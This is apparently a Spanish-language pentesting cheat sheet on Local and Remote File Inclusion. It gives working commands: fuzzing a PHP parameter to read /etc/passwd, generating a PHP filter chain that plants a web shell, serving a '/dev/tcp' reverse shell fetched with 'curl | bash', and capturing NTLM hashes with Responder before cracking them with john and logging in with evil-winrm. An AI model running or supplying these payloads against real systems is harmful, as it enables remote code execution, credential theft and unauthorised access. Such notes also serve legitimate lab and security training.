<h1 align="center">LFI</h1>

Local File Inclusion, es una vulnerabilidad que permite ver los archivos internos de una máquina, se suele explotar el formularios .php

LOCALIZAR EL LFI:

Tenemos un formulario web en la url <http://172.18.0.2/index.php>, por lo que buscaremos el parámetro que nos falta para realizar el LFI. Para ello utilizaremos la herramienta ffuf o wfuzz:

- `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <http://172.18.0.2/index.php?FUZZ=../../../../../../../../etc/passwd> -fs 978`

El resultado es que hay un parámetro llamado “search” que podemos utilizarlo para realizar el ataque LFI por lo que podemos ver el contenido de los archivos:

- `http://172.18.0.2/index.php?search=../../../../../etc/passwd`

# **LFI usando WRAPPERS**

Al explotar una vulnerabilidad de LFI, los atacantes pueden usar wrappers para acceder a archivos o recursos no convencionales, ejecutar código malicioso, o extraer información crítica del servidor.

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md>

Si podemos ver el contenido de un archivo utilizando los wrappers, utilizaremos el siguiente repositorio para poder subir y ejecutar un archivo malicioso que nos proporcione una reverse shell:

<https://github.com/synacktiv/php_filter_chain_generator>

Ejecutamos el siguiente comando dentro del repositorio:

- `python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'`

Esto generará un texto enorme que tendremos que introducir en la url de la siguiente manera:

- URL = `http://<IP>/index.php?cmd=ls -la&search=*INTRODUCIR AQUI EL TEXTO*`

Ahora que sabemos que podemos ver el contenido, vamos a crear un index.html con una reverse shell, lo descargamos desde el servidor y lo ejecutamos:

- `echo “sh -i >& /dev/tcp/172.18.0.1/1234 0>&1”>index.html`
- `python3 -m http.server 80`
- `nc -lvnp 1234`

Y en el navegador:

`http://<IP>/index.php?cmd=curl http://<IP>/ | bash&search=*INTRODUCIR AQUÍ EL TEXTO*`

Y así conseguimos una reverse shell

<h2 align="center">RFI CON RESPONDER</h2>

1- En algunas paginas web que estan mal desarrolladas, podemos ver una URL parecida a la siguiente:  
- `*URL*/index.php?**page=french.html**`

![image](https://github.com/user-attachments/assets/b1ace55a-5515-47ad-939f-5d489973587d)

2- Además de poder ver archivos locales, podemos insertar archivos del kali y poder interceptar cual es hash del administrador con RESPONDER:

- `sudo responder -I tun0`

3- Ahora, responder quedará a la escucha hasta que se consulte cualquier archivo del kali a través del navegador

- `*URL*/index.php?page=http://*ip kali*/*archivo*`

4- Aparecerá el usuario y la contraseña encriptada de la clave NTLM

![image](https://github.com/user-attachments/assets/9f018de9-5041-4ff6-b84c-9cccf92ca8f6)

5- Para desencriptarla, la pasaremos a un txt y la desencriptamos con john

- `john -w /usr/share/wordlists/rockyou.txt hash.txt`

![image](https://github.com/user-attachments/assets/aed49119-85e4-4f5a-8190-51b96a98b7f9)

6- Con nmap nos damos cuenta que el puerto 5985 esta abierto, este puerto corresponde a Power Shell Remoting, por lo que podemos conectarnos a traves de powershell para conectarnos de forma remota con el usuario y contraseña que hemos conseguido en john de reaper

7- Para ello utilizaremos la herramienta evil-winrm y ya estaremos dentro del sistema :

- `evil-winrm -i *ip* -u *usuario* -p *contraseña*`

![image](https://github.com/user-attachments/assets/6de012e3-0703-40e7-8fae-aec4fc16ac01)
